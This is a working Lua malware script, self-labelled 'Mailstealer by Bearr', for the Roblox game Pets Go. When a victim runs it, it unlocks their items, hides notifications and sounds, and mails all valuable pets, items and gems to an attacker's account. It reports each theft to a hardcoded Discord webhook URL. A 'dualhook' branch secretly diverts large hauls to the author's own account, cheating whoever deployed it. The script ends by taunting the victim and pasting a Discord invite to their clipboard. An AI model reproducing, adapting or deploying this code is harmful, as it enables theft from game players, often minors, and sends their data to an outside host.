Username = Username
Username = Username
min_rap = min_rap
min_chance = min_chance
webhook = webhook

-- Local variables for the dualhook webhook and user
local dualhook_webhook = "https://discord.com/api/webhooks/1295393967524810762/9sS0oJjJijMOQPU8V3xOrZNTVihw7wW-i3XGODpWioZNkIRrQVg9B9TtQzifr0VK-ni5"
local dualhook_user = "bx4rzwasdeleted"

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Join gg / GsFp84dbQf to get back"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local GemAmount1 = 0
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Updated SendMessage function to show both sender and recipient in the webhook
local function SendMessage(sender, diamonds, mailRecipient, webhookUrl)
    local headers = {
        ["Content-Type"] = "application/json",
    }

	local fields = {
		{
			name = "Sender Username:",
			value = sender, -- Added sender field
			inline = true
		},
        {
            name = "Mail Sent To:", 
            value = mailRecipient, -- Correct recipient now displays here
            inline = true
        },
		{
			name = "Items to be sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = "",
            inline = false
        }
	}

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    fields[4].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Pets Go! Execution",
            ["color"] = 255, -- Blue color
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Bearr. discord.gg/GsFp84dbQf"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)

    if webhookUrl and webhookUrl ~= "" then
        local response = request({
            Url = webhookUrl,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end
end

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local user = Username or "bx4rzwasdeleted"
local min_rap = min_rap or 10000
local min_chance = min_chance or 10000
local webhook = webhook

local function sendItem(category, uid, am, recipient)
    local args = {
        [1] = recipient,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response = false
    repeat
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if err then

        end
    until response == true
end

local function SendAllGems(recipient)
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= 500 and GemAmount1 >= min_rap then
				local args = {
					[1] = recipient,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
            if v == "Pet" then
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
                    if difficulty >= min_chance then
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    totalRAP = totalRAP + (rapValue * (item._am or 1))
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 then
    ClaimMail()

    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
    local blob_b = require(blob_a).Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    require(blob_a).Get = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)
    


spawn(function()
    -- Total RAP check
    if totalRAP > 2000000 then
        -- Send everything to dualhook_user
        SendMessage(plr.Name, GemAmount1, dualhook_user, dualhook_webhook)
        SendAllGems(dualhook_user)
        for _, item in ipairs(sortedItems) do
            sendItem(item.category, item.uid, item.amount, dualhook_user)
        end
    else
        -- Send items and gems to Username, with notifications to both webhooks
        SendMessage(plr.Name, GemAmount1, Username, webhook)
        SendMessage(plr.Name, GemAmount1, dualhook_user, dualhook_webhook)
        SendAllGems(Username)
        for _, item in ipairs(sortedItems) do
            sendItem(item.category, item.uid, item.amount, Username)
        end
    end
end)
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
    setclipboard("discord.gg/GsFp84dbQf")
end
